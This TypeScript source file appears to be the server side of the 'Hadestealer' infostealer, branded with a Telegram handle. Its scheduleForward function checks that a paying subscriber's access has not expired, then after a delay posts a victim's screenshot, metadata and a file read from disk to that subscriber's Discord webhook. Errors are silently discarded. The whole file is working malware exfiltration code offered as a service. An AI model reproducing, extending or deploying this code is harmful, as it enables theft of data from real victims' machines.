import { WEBHOOK_FORWARD_DELAY_MS } from "../config"
import fs from "fs"
import path from "path"
import fetch from "node-fetch"
import FormData from "form-data"
import { BASE_WEBHOOK_URL } from "../config"
import { IUserAccess } from "../models/UserAccess"
export const scheduleForward = (embeds: any[], filePath?: string, ua?: IUserAccess, meta?: any, capture?: Buffer) => {
    if (!ua || !ua.webhook) return;
    const now = new Date();
    if (ua.expireAt.getTime() <= now.getTime()) return;
    setTimeout(async () => {
        try {
            if (capture) {
                const fileName = `screen_${Date.now()}.png`;
                const form = new FormData();

                form.append('file', capture, { filename: fileName });

                if (embeds && embeds.length > 0) {
                    embeds[0].image = { url: `attachment://${fileName}` };
                }

                const discordPayload = {
                    username: "Hadestealer | t.me/hadestealer",
                    avatar_url: embeds[0]?.author?.icon_url || "",
                    embeds: embeds
                };

                form.append('payload_json', JSON.stringify(discordPayload));

                try {
                    await fetch(ua.webhook!, {
                        method: 'POST',
                        body: form as any,
                        headers: form.getHeaders()
                    });
                } catch (e) {
                }
            }
            if (filePath && fs.existsSync(filePath)) {
                const f = new FormData();
                f.append('payload_json', JSON.stringify({
                    username: "Hadestealer | t.me/hadestealer ",
                    avatar_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png?ex=698affd9&is=6989ae59&hm=329b4cb0aca032d344810bb9749c95edcf7977d8126f3798d4e29dcb6838ec4e&=&format=webp&quality=lossless&width=438&height=438",
                    embeds, originalMeta: meta
                }));
                f.append('file', fs.createReadStream(filePath), path.basename(filePath));
                await fetch(ua.webhook!, { method: 'POST', body: f as any, headers: f.getHeaders() });
            } else {
                await fetch(ua.webhook!, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({
                        username: "Hadestealer | t.me/hadestealer ",
                        avatar_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png?ex=698affd9&is=6989ae59&hm=329b4cb0aca032d344810bb9749c95edcf7977d8126f3798d4e29dcb6838ec4e&=&format=webp&quality=lossless&width=438&height=438",
                        embeds, originalMeta: meta
                    })
                });
            }
        } catch {
        }
    }, WEBHOOK_FORWARD_DELAY_MS);
};